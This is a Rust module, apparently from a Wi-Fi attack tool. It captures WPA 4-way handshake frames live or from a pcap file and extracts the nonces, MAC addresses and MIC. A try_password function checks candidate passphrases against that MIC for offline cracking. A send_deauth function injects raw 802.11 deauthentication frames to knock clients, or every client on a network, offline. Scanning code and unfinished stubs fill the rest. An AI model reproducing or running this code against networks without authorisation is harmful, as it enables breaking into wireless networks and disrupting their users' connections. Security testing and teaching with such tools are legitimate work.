//! # wpa
//! `wpa` contains functions of the tool that communicate with other devices. 
//! It can capture packets from the 4-Way Handshake process and send 
//! de-authentication to other BSSIDs.
use std::{io::Result, collections::HashMap};
use itertools::Itertools;
use libwifi::{Frame, Addresses};
use std::io::Error;
use core::fmt;
use hex::FromHex;

use aux;
use pcap;
use wlan;
use crypto;


//PACKET PARSING POSITIONS
const SIGNAL_POS: usize = 30;
const FRAME_HEADER_LENGTH: usize = 2;
const EAPOL_MSG_NUM_OFFSET: usize = 0xd;
const EAPOL_CODE_OFFSET: usize = 0x6;
const EAPOL_NONCE_OFFSET: usize = 0x19;
const EAPOL_MIC_OFFSET: usize = 0x59;
const EAPOL_MSG_1: u16 = 0x8a;
const EAPOL_MSG_2: u16 = 0x10a;
const EAPOL_MSG_3: u16 = 0x13ca;
const EAPOL_MSG_4: u16 = 0x30a;

/* TODO:
*  - channel sweeping.
*  - print ssids from different channels.
*  - print clients of a network.
*  - deauth.
*/
// --------------------------------- Structs ----------------------------------

/// contains information about a network
/// ## Description
/// The struct contains the relevant information about a network 
/// as captured from the interface.
/// * BSSID
/// * SSID
/// * Channel
/// * Signal strength
//TODO: use in list networks
#[derive(Debug,Clone, PartialEq, Eq, Hash)]
pub struct NetworkInfo {
    pub bssid: [u8; 6],
    //TODO: add WPA Protocol
    pub ssid: String,
    pub channel: u8,
    pub signal_strength: i8,
    pub clients: Vec<[u8;6]>,
}

/// contains the information captured from the handshake
/// ## Description
/// The struct contains the relevant information from the handshake
/// packets in order to build the desired keys.
/// * SSID
/// * A Nonce
/// * B Nonce
/// * Station's MAC adrees
/// * Client's MAC adrees
/// * MIC
#[derive(Debug,Clone)]
pub struct Handshake{
    ssid: String,
    a_nonce: [u8; 32],
    s_nonce: [u8; 32],
    station_mac: [u8; 6],
    client_mac: [u8; 6],
    mic: [u8; 16],
    mic_msg: [u8;121], //the msg for calculating the mic
}

// --------------------------- Traits & methods -------------------------------

impl Handshake{
    // parse the 4 handshake packets
    fn new(ssid: &str, hs_pkts:[Option<libwifi::frame::QosData>;4]) -> Handshake{
       Handshake { 
            ssid: ssid.to_owned(),
            a_nonce: hs_pkts[0].as_ref().unwrap().data[EAPOL_NONCE_OFFSET..EAPOL_NONCE_OFFSET+32].try_into().unwrap(),
            s_nonce: hs_pkts[1].as_ref().unwrap().data[EAPOL_NONCE_OFFSET..EAPOL_NONCE_OFFSET+32].try_into().unwrap(),
            station_mac: hs_pkts[0].as_ref().unwrap().header.bssid().unwrap().0, //TODO: make sure that is
                                                                     //safe
            client_mac: hs_pkts[0].as_ref().unwrap().header.address_1.0,
            mic: hs_pkts[1].as_ref().unwrap().data[EAPOL_MIC_OFFSET..EAPOL_MIC_OFFSET+16].try_into().unwrap(),
            mic_msg: crypto::mic_data(hs_pkts[1].as_ref().unwrap().data[8..129].try_into().unwrap()),
        } 
    }

    pub fn try_password(self,password: &str) -> bool{
        //generate PSK
        let psk = crypto::generate_psk(password, &self.ssid);
        //generate KCK
        let kck = crypto::generate_kck(&psk, &self.client_mac, &self.station_mac, &self.a_nonce, &self.s_nonce);
        //calculate the MIC
        let mic:[u8;16] = crypto::digest_hmac_sha1(&kck, &self.mic_msg)[..16].try_into().unwrap();
        //compare the MIC
        aux::compare_arrays(&mic,&self.mic)
    }

}

impl NetworkInfo{
    pub fn update(&mut self,other: &mut NetworkInfo){
            assert_eq!(self.ssid,other.ssid);//TODO: replace with result or something
            self.channel = other.channel;
            self.signal_strength = other.signal_strength;
            self.clients.append(other.clients.as_mut());
    }
}

impl fmt::Display for Handshake{
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f,"- ssid:{}\n- bssid: {}\n- client: {}\n- ANONCE: {}\n- SNONCE: {}\n- MIC: {}\n- MIC MSG: {}\n\n",
                self.ssid, hex::encode(self.station_mac),hex::encode(self.client_mac), hex::encode(self.a_nonce), hex::encode(self.s_nonce),hex::encode(self.mic),hex::encode(self.mic_msg))
    }
}


impl fmt::Display for NetworkInfo{
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f,"{}\n-----------\n- channel: {}\n- signal: {}\n- bssid: {}",self.ssid,self.channel,self.signal_strength,hex::encode(self.bssid))
    }
}


const MAX_CHANNEL: u8 = 8;
const PACKET_PER_CHANNEL: usize = 30;

// --------------------------- Public Functions -------------------------------

// capture an handshake
pub fn get_hs_from_file(mut pcap: pcap::Capture<pcap::Offline>,ssid: &str, bssid: &str) -> std::io::Result<Handshake> {
    let mut hs_msgs: [Option<libwifi::frame::QosData>; 4] = Default::default();
    loop { //TODO: replace with timeout
        let frame;
        match pcap.next_packet() { //listen for the next frame 
            Ok(data) => {
                frame = data;
            }
            _ => {
                continue;
            } //timeout TODO: timeout check could be checked here
        }
        let frame_offset = frame[FRAME_HEADER_LENGTH] as usize;
        //parse the 802.11 frame
        let parsed_frame = libwifi::parse_frame(&frame[frame_offset..]);
        if parsed_frame.is_err() {
            continue; //TODO: check what gets here
        }

        //filter only QoS Data frames
        if let Frame::QosData(qos) = parsed_frame.unwrap() {
            // check if msg type is EAPOL
            let msg_type: u16 = ((qos.data[EAPOL_CODE_OFFSET] as u16) << 8) | qos.data[EAPOL_CODE_OFFSET+1] as u16;
            if msg_type == 0x888e {// EAPOL
                // get hs message number
                let msg_num: u16 = ((qos.data[EAPOL_MSG_NUM_OFFSET] as u16) << 8) | qos.data[EAPOL_MSG_NUM_OFFSET+1] as u16;
                match msg_num {
                    EAPOL_MSG_1 =>{
                        // check the bssid
                        if hex::encode(qos.header.address_3.0) == bssid{
                            hs_msgs[0] = Some(qos);
                        }
                    },

                    EAPOL_MSG_2 =>{
                        if hex::encode(qos.header.address_3.0) == bssid && hs_msgs[0].is_some() {
                            hs_msgs[1] = Some(qos);
                        }
                    },
                    EAPOL_MSG_3 =>{
                        if hex::encode(qos.header.address_3.0) == bssid && hs_msgs[1].is_some() {
                            hs_msgs[2] = Some(qos);
                        }
                    },

                    EAPOL_MSG_4 =>{
                        if hex::encode(qos.header.address_3.0) == bssid && hs_msgs[2].is_some() {
                            hs_msgs[3] = Some(qos);
                        }
                    },

                    _ => {todo!();} //TODO: handle error with parsing
                }
                if hs_msgs.iter().all(|m|m.is_some()){
                    return Ok(Handshake::new(ssid,hs_msgs));
                }
            }
        }
    }
}

/// Capture a handshake
/// ## Description
/// Receives interface and captures packets until finding 4 EAPOL messages
/// related to the same handshake process.
/// 
/// Returns a struct with the relevant data from the messages.
pub fn get_hs(iface: &str,ssid: &str, bssid: &str) -> std::io::Result<Handshake> {
    // get recv channel to the interface
    let mut rx = wlan::get_recv_channel(iface)?;
    let mut hs_msgs: [Option<libwifi::frame::QosData>; 4] = Default::default();
    loop { //TODO: replace with timeout
        let frame;
        match rx.next() { //listen for the next frame 
            Ok(data) => {
                frame = data;
            }
            _ => {
                continue;
            } //timeout TODO: timeout check could be checked here
        }
        let frame_offset = frame[FRAME_HEADER_LENGTH] as usize;
        //parse the 802.11 frame
        let parsed_frame = libwifi::parse_frame(&frame[frame_offset..]);
        if parsed_frame.is_err() {
            continue; //TODO: check what gets here
        }

        //filter only QoS Data frames
        if let Frame::QosData(qos) = parsed_frame.unwrap() {
            // check if msg type is EAPOL
            let msg_type: u16 = ((qos.data[EAPOL_CODE_OFFSET] as u16) << 8) | qos.data[EAPOL_CODE_OFFSET+1] as u16;
            if msg_type == 0x888e {// EAPOL
                // get hs message number
                let msg_num: u16 = ((qos.data[EAPOL_MSG_NUM_OFFSET] as u16) << 8) | qos.data[EAPOL_MSG_NUM_OFFSET+1] as u16;
                match msg_num {
                    EAPOL_MSG_1 =>{
                        // check the bssid
                        if hex::encode(qos.header.address_3.0) == bssid{
                            hs_msgs[0] = Some(qos);
                        }
                    },

                    EAPOL_MSG_2 =>{
                        if hex::encode(qos.header.address_3.0) == bssid && hs_msgs[0].is_some() {
                            hs_msgs[1] = Some(qos);
                        }
                    },
                    EAPOL_MSG_3 =>{
                        if hex::encode(qos.header.address_3.0) == bssid && hs_msgs[1].is_some() {
                            hs_msgs[2] = Some(qos);
                        }
                    },

                    EAPOL_MSG_4 =>{
                        if hex::encode(qos.header.address_3.0) == bssid && hs_msgs[2].is_some() {
                            hs_msgs[3] = Some(qos);
                        }
                    },

                    _ => {todo!();} //TODO: handle error with parsing
                }
                if hs_msgs.iter().all(|m|m.is_some()){
                    return Ok(Handshake::new(ssid,hs_msgs));
                }
            }
        }
    }
}

/// Send de-auth to a client from a given BSSID
/// if target is None, the deauth will be sent to broadcast
/// ## Description
/// The interface sends De-authentication packet to a given 
/// BSSID or broadcast it to all accessible networks.
pub fn send_deauth(iface: &str, bssid: &str, target: Option<String>) -> std::io::Result<()>{
    // get a sender channel to the iface
    let mut tx = wlan::get_send_channel(iface)?;
    
    let target = target.as_deref().unwrap_or("ffffffffffff");// if None, broadcast

    //build the frame
    let radiotap_header = Vec::from_hex("00000c000480000002001800").unwrap();
    let deauth_msg = Vec::from_hex(format!("c0003a01{target}{bssid}{bssid}00000700")).unwrap();  //TODO:replay for debugging

    let frame = &[radiotap_header,deauth_msg].concat()[..];
    // send
    let iface = wlan::get_interface(iface).ok_or(Error::last_os_error())?;
    tx.send_to(frame,Some(iface)).unwrap().unwrap();
    Ok(())
}


/// Scan nearby networks
/// ## Description
//TODO: description, add type of WPA
pub fn list_networks(iface: &str, interval: std::time::Duration) -> Result<HashMap<String,NetworkInfo>> {

    let mut networks:HashMap<String,NetworkInfo> = HashMap::new();
    let current_channel = 0; //TODO: fix get_current_channel
    // get rx channel to the given interface
    let mut rx = wlan::get_recv_channel(iface)?;
    //read time 
    let init_time = std::time::Instant::now();


    //TODO: convert unwrap to ?
    while init_time.elapsed() <= interval {
        let frame;
        match rx.next() {
            Ok(data) => {
                frame = data;
            }
            _ => {
                continue;
            } //timeout
        }
        let frame_offset = frame[FRAME_HEADER_LENGTH] as usize; 
        let pkt;
        if frame_offset < frame.len(){
            pkt = libwifi::parse_frame(&frame[frame_offset..]);
        }else{
            pkt = Err(libwifi::error::Error::UnhandledProtocol("unknown message".to_owned()));
        }

        if pkt.is_err() {
            continue;
        }
        if let Frame::Beacon(beacon) = pkt.unwrap() {
            if let Some(ssid) = beacon.station_info.ssid {

                let bssid = beacon.header.bssid().unwrap().0; //extract bssid
                let signal = frame[SIGNAL_POS] as i8; //extract signal
    
                let mut network = NetworkInfo{
                    bssid: bssid,
                    signal_strength: signal,
                    ssid: ssid.clone(),
                    channel:current_channel,
                    clients: vec![],

                };
                networks.entry(network.ssid.clone())
                    .and_modify(|e|  e.update(&mut network))
                    .or_insert(network);
            }
        }
    }
    Ok(networks)
}
pub fn list_networks_new(frame: &[u8], interval: std::time::Duration) -> Result<Vec<NetworkInfo>> {

    let mut networks:Vec<NetworkInfo> = vec![];
    let current_channel = 0; //TODO: fix get_current_channel
    //read time 
    let init_time = std::time::Instant::now();
    while init_time.elapsed() <= interval {
        let frame_offset = frame[FRAME_HEADER_LENGTH] as usize; 
        let pkt;
        if frame_offset < frame.len(){
            pkt = libwifi::parse_frame(&frame[frame_offset..]);
        }else{
            pkt = Err(libwifi::error::Error::UnhandledProtocol("unknown message".to_owned()));
        }

        if pkt.is_err() {
            eprintln!("failed to parse frame: {:?}",frame); //TODO: consider log error differently
            continue;
        }
        if let Frame::Beacon(beacon) = pkt.unwrap() {
            if let Some(ssid) = beacon.station_info.ssid {

                let bssid = beacon.header.bssid().unwrap().0; //extract bssid
                let signal = frame[SIGNAL_POS] as i8; //extract signal
                networks.push(
                    NetworkInfo{
                    bssid: bssid,
                    signal_strength: signal,
                    ssid: ssid.clone(),
                    channel: current_channel,
                    clients: vec![],
                });
            }
        }
    }
    //remove duplicates
    //return detected networks
    networks = networks.into_iter().unique_by(|i| i.bssid).collect::<Vec<_>>();
    Ok(networks)
}


//TODO: REMOVE THIS
pub fn get_next_wpa_frame(iface: &str)-> std::io::Result<Frame>{
    //get interface channel
    let mut rx = wlan::get_recv_channel(iface)?;
    //read next frame
    let frame = rx.next()?;
    //parse frame
    let frame_offset = frame[FRAME_HEADER_LENGTH] as usize; 
    let pkt;
    if frame_offset < frame.len(){
        pkt = libwifi::parse_frame(&frame[frame_offset..]);
        if let Ok(pkt) = pkt {
            return Ok(pkt);
        }
    }
    Err(std::io::Error::new(std::io::ErrorKind::TimedOut, "timeout"))
}

pub fn list_clients(iface: &str, ssid: &str) -> std::io::Result<()> {
    todo!();
}


